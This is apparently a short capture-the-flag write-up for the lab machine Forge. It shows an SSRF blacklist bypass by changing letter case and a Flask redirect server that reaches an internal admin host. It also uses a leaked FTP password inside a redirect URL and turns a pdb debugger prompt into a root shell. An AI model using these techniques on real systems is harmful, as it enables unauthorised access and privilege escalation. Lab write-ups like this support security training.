@@ -1,0 +1,57 @@
+we have a site with 2 options to upload a file
+
+after trying upload a file was of no use
+
+so we tried to upload via link
+
+pointing it our ip it gives back connection but when pointing it to its own localaddress or ip not says blacklisted
+
+we can change the casing of  the ip like  ==ForGe.Htb== and it gives back internal files
+
+OR
+
+so created a ==python scrip==t to redirect it its own ip when it connect to our own ip
+
+```
+#!/usr/bin/env python
+
+from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+@app.route("/")
+def admin():
+    return redirect('http://admin.forge.htb/')
+
+@app.route("/1")
+def announcements():
+    return redirect('http://admin.forge.htb/announcements')
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=80)
+```
+
+the host page / said to look into announcent for ftp and it gave creds
+
+so for ftp we added
+
+```
+@app.route("/3")
+def ftp_via_admin():
+    f = request.args.get('f', default='')
+    return redirect(f'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/{f}')
+```
+
+and we got files
+
+now for root part
+
+we had a file with secret in it says to run nc on a random port on runing it it prints the random port so we made 2 session and on other session we used that port and as we put some random char it gives us ==pdb== on first connection
+
+now we can
+
+```
+import os;os.system("/bin/bash")
+```
+
+and we have a shell
